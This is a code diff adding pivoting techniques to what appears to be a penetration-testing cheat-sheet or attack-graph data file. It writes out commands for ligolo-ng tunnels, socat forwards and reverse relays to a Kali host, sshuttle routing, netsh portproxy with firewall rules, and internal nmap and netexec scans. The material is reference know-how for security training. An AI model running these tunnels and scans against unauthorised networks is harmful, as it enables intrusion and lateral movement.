@@ -133,6 +133,38 @@ chisel.exe client <kali-ip>:8080 R:445:127.0.0.1:445`,
             tags: ['chisel', 'socks', 'windows', 'http-tunnel'],
         },
         {
+            id: 'ligolo',
+            title: 'ligolo-ng tunnel',
+            type: 'technique',
+            phase: 'pivoting',
+            os: 'agnostic',
+            description:
+                'A faster, cleaner alternative to chisel for routing a whole internal subnet. Run the proxy on Kali, drop the agent on the pivot, then add the internal route so every tool reaches it directly through the tun interface - no proxychains needed.',
+            commands: [
+                {
+                    label: 'Setup (Kali proxy + target agent)',
+                    code: `# Kali (proxy):
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 10.10.10.0/24 dev ligolo
+./proxy -selfcert
+# target (agent):
+agent.exe -connect <kali-ip>:11601 -ignore-cert`,
+                },
+                {
+                    label: 'Start the tunnel + use tools directly',
+                    code: `# in the proxy console, once the agent checks in:
+session          # select the agent
+ifconfig         # view the pivot's interfaces
+start            # begin tunnelling
+# from Kali, tools now reach the internal subnet without proxychains:
+nmap -sT -Pn 10.10.10.0/24
+netexec smb 10.10.10.0/24 -u <user> -p <pass>`,
+                },
+            ],
+            tags: ['ligolo', 'tunnel', 'tun', 'subnet', 'pivot'],
+        },
+        {
             id: 'proxychains',
             title: 'Run tools through the proxy',
             type: 'technique',
@@ -155,6 +187,77 @@ proxychains -q impacket-GetUserSPNs -request -dc-ip <dc> <domain>/<user>`,
             ],
             tags: ['proxychains', 'socks', 'nmap', 'netexec'],
         },
+        {
+            id: 'socat-forward',
+            title: 'socat port forward',
+            type: 'technique',
+            phase: 'pivoting',
+            os: 'agnostic',
+            description:
+                'A single static binary that forwards TCP ports both ways. Great when the pivot has socat or you can drop a static build.',
+            commands: [
+                {
+                    label: 'Forward a port to an internal host',
+                    code: `# on the pivot:
+socat TCP-LISTEN:445,fork TCP:<internal-ip>:445
+# then from Kali:
+smbclient //<pivot>/share -N`,
+                },
+                {
+                    label: 'Reverse relay back to Kali',
+                    code: `# Kali listener:
+socat TCP-LISTEN:80,fork TCP:127.0.0.1:8080
+# pivot (connect out):
+socat TCP:<kali-ip>:80 TCP:<internal-ip>:80`,
+                },
+            ],
+            tags: ['socat', 'forward', 'relay', 'static'],
+        },
+        {
+            id: 'sshuttle',
+            title: 'sshuttle VPN over SSH',
+            type: 'technique',
+            phase: 'pivoting',
+            os: 'linux',
+            description:
+                'Route a whole subnet through an SSH pivot without touching the target config - transparent, no proxychains needed.',
+            commands: [
+                {
+                    label: 'Route a subnet',
+                    code: `sshuttle -r <user>@<pivot> <internal-subnet>/24
+# with a key:
+sshuttle -r <user>@<pivot> --ssh-cmd 'ssh -i id_rsa' <internal-subnet>/24`,
+                },
+                {
+                    label: 'Exclude the pivot itself',
+                    code: `sshuttle -r <user>@<pivot> -x <pivot-ip> <internal-subnet>/24
+# then run tools directly against the internal range`,
+                },
+            ],
+            tags: ['sshuttle', 'vpn', 'subnet', 'route'],
+        },
+        {
+            id: 'windows-portproxy',
+            title: 'Windows netsh portproxy',
+            type: 'technique',
+            phase: 'pivoting',
+            os: 'windows',
+            description:
+                'On a Windows pivot, netsh interface portproxy forwards a local port to an internal host. Needs admin and the IP Helper service running.',
+            commands: [
+                {
+                    label: 'Add a portproxy',
+                    code: `netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=445 connectaddress=<internal-ip>
+netsh interface portproxy show all`,
+                },
+                {
+                    label: 'Firewall + cleanup',
+                    code: `netsh advfirewall firewall add rule name="pivot 445" dir=in action=allow protocol=TCP localport=445
+netsh interface portproxy delete v4tov4 listenport=445 listenaddress=0.0.0.0`,
+                },
+            ],
+            tags: ['portproxy', 'netsh', 'windows', 'forward'],
+        },
     ],
     edges: [
         { from: 'foothold-linux', to: 'pivot-discovery', label: 'second NIC / new subnet' },
@@ -168,8 +271,17 @@ proxychains -q impacket-GetUserSPNs -request -dc-ip <dc> <domain>/<user>`,
         { from: 'ssh-dynamic-socks', to: 'proxychains', label: 'SOCKS up' },
         { from: 'ssh-remote-forward', to: 'proxychains', label: 'SOCKS up' },
         { from: 'chisel', to: 'proxychains', label: 'SOCKS up' },
+        { from: 'pivot-discovery', to: 'ligolo', label: 'route the whole subnet (no SSH)' },
+        { from: 'ligolo', to: 'smb-enum', label: 'enumerate the internal host' },
+        { from: 'ligolo', to: 'ad-null-enum', label: 'internal DC reachable' },
         { from: 'proxychains', to: 'smb-enum', label: 'enumerate the internal host' },
         { from: 'proxychains', to: 'ad-null-enum', label: 'internal DC reachable' },
+        { from: 'pivot-discovery', to: 'socat-forward', label: 'static socat available' },
+        { from: 'pivot-discovery', to: 'sshuttle', label: 'have SSH on the pivot' },
+        { from: 'pivot-discovery', to: 'windows-portproxy', label: 'Windows pivot + admin' },
+        { from: 'socat-forward', to: 'smb-enum', label: 'enumerate the internal host' },
+        { from: 'sshuttle', to: 'smb-enum', label: 'enumerate the internal host' },
+        { from: 'windows-portproxy', to: 'smb-enum', label: 'enumerate the internal host' },
     ],
 }
 
